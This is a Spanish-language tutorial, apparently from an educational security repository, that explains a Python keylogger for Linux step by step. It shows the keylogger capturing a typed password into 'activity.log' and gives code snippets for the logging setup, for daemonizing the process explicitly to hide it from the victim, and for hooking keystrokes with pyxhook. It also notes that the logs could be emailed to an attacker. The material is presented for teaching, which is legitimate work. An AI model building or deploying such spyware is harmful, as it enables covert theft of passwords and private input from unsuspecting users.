

# Spyware

Existen muchas formas de espiar a la víctima. Nuestro **spyware** está representado por el **keylogger**, un programa sencillo que monitorea las teclas presionadas en el teclado y puede ver todo lo que escribes. Este **keylogger** está implementado en el archivo `keylogger.py`.

#### Demostración de comportamiento

No necesitamos ninguna preparación específica antes de ejecutar el keylogger (`./keylogger.py`). Podemos observar que después de la ejecución no pasó nada y podemos escribir nuevos comandos, al igual que si solo presionamos la tecla `Enter`. Ahora puedes hacer lo que quieras en tu sistema. Para la demostración, puedes abrir un navegador y escribir algo como `Passwd` representando tu contraseña potencial, tal como lo harías en cualquier página de inicio de sesión de tu red social.

Ahora puedes ver que en la misma carpeta donde se encuentra nuestro **keylogger** hay un nuevo archivo `activity.log`. Al observar el archivo, puedes ver que contiene todas las teclas que presionaste en tu teclado después de la ejecución, incluida tu contraseña `Passwd`. El atacante puede acceder fácilmente a estos archivos y modificar el keylogger para enviarlos a una dirección de correo electrónico específica o, combinándolo con diferentes tipos de malware, puede obtener acceso directo a ellos a través de la red.

```
Key: P
Key: a
Key: s
Key: s
Key: w
Key: d
```

La creación del **keylogger** es un proceso muy sencillo, como se describe a continuación, y cualquier persona puede hacerlo con solo un conocimiento básico de programación y comprensión de sistemas operativos. Es por eso que debemos tener siempre precaución al ejecutar cualquier archivo inusual o no confiable.

#### ¿Cómo funciona?

 - En primer lugar, configuramos nuestro registrador (logger). Podemos especificar el archivo en el que se deben almacenar los datos, así como el formato del mensaje.
   ```python
   logging.basicConfig(
       level=logging.DEBUG,
       filename='activity.log',
       format='Key: %(message)s',
   )
   ```
 - Luego, debemos obtener el controlador (handler) del archivo de registro. Explicaremos por qué en el siguiente paso.
   ```python
   handler = logging.getLogger().handlers[0].stream
   ```
 - Para hacer que nuestro spyware sea más difícil de detectar por parte de la víctima, queremos que se ejecute en segundo plano como un **daemon**.
   Para saber más sobre daemons, consulte [la guía de daemons](https://kb.iu.edu/d/aiau). Con este fin,
   usaremos un módulo estándar de Python `daemon` que nos permitirá convertir en daemon a nuestro **keylogger**.
   Cuando se cree el daemon, perderemos la conexión con todos los controladores de archivos como `stdout` o incluso
   nuestro archivo de registro, a menos que especifiquemos que los archivos deben conservarse. Por eso obtuvimos el
   controlador del archivo de registro en el paso anterior. En el contexto de nuestro daemon oculto, ahora podemos crear el
   keylogger e iniciar su actividad.
   ```python
   # Daemonize the process to hide it from the victim.
   with daemon.DaemonContext(files_preserve=[handler]):
       # Create keylogger.
       keylogger = Keylogger('SimpleSpyware')
       # Start logging activity of the user.
       keylogger.start_logging()
   ```
  - Para obtener los _eventos de presión de tecla_ podemos usar un módulo de Python para Linux llamado `pyxhook`. Si
    crearíamos un keylogger para Windows, deberíamos usar el módulo `pyHook`, pero su interfaz es
    muy similar. Creamos un **gestor de ganchos**, que gestionará el manejo de eventos y nos permitirá
    definir una función de devolución de llamada (callback) para estos eventos. El callback es, en nuestro caso, una función que se llamará cada vez que se obtenga un nuevo
    evento (__keydown_callback_). La única cosa que hace este método es registrar la tecla en nuestro
    archivo especificado `activity.log`.
    ```python
    hook_manager = pyxhook.HookManager()
    # Assign callback for handling key strokes.
    hook_manager.KeyDown = self._keydown_callback
    # Hook the keyboard and start logging.
    hook_manager.HookKeyboard()
    hook_manager.start()
    ```
